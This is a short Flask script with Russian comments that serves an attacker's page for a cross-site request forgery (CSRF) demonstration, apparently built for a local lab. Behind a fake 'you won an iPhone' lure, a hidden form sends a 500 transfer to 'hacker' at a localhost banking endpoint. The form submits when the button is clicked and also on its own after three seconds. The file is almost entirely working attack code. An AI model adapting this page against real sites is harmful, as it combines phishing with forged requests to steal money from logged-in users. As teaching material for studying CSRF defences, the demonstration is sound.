from flask import Flask, render_template_string

app = Flask(__name__)

# Страница злоумышленника с CSRF-атакой
@app.route('/')
def malicious_page():
    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Выиграй iPhone!</title>
    </head>
    <body>
        <h1>🎉 Вы выиграли iPhone! 🎉</h1>
        <p>Для получения приза нажмите кнопку ниже:</p>
        
        <!-- Скрытая форма для CSRF-атаки -->
        <form id="csrfForm" action="http://localhost:5000/transfer" method="POST" style="display: none;">
            <input type="hidden" name="amount" value="500">
            <input type="hidden" name="recipient" value="hacker">
        </form>
        
        <button onclick="document.getElementById('csrfForm').submit()">
            Получить приз!
        </button>
        
        <script>
            // Автоматическая отправка формы
            setTimeout(function() {
                document.getElementById('csrfForm').submit();
            }, 3000);
        </script>
        
        <p><small>PS: Пока вы ждете, мы незаметно переведем ваши деньги 😈</small></p>
    </body>
    </html>
    ''')

if __name__ == '__main__':
    app.run(debug=True, port=5002)